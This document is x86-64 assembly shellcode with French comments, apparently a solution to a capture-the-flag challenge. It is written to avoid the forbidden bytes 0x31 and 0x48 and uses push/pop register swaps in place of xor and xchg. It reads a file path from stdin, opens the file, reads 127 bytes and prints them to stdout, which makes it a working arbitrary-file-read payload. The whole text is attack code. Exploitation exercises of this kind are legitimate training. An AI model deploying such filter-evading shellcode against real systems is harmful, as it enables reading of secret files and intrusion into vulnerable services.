[SECTION .TEXT]
	global _main
_main:
	push byte 1
	pop rbx
	dec bl              ; rbx = 0, évite les caractères 0x31 et 0x48. 

	push rbx
	pop rax             ; rax = 0 

	push rbx
	pop rdi             ; stdin est 0

	push rsp            
	pop rsi             

	push byte 24        ; lire 24 bytes
	pop rdx
	syscall

	push rbx
	pop rax
	inc al
	inc al              ; syscall open

	;xchg rsi, rdi      ; attention à 0x48 caractère interdit
	push rdi            ; on va faire un swap comme mentionné dans le readme
	push rsi
	pop rdi             ; rdi pointe vers le chemin du fichier
	pop rsi             ; rsi est a 0 (flag O_RDONLY)

	syscall
						; swap de 3 registres
	push rax            ; fd of just opened file
	push rsi            ; rsi = 0
	push rdi            ; rdi = pointeur au top du stack
	pop rsi             ; rsi = buf
	pop rax             ; rax = 0 syscall read
	pop rdi             ; rdi = fd

	push byte 127
	pop rdx             ; Nombre de byte à lire
	syscall             ; syscall read

	push rbx
	pop rax
	inc al              ; syscall write
	push rax            ; copy rax (==1) à rdi
	pop rdi             ; 1 = stdout
	syscall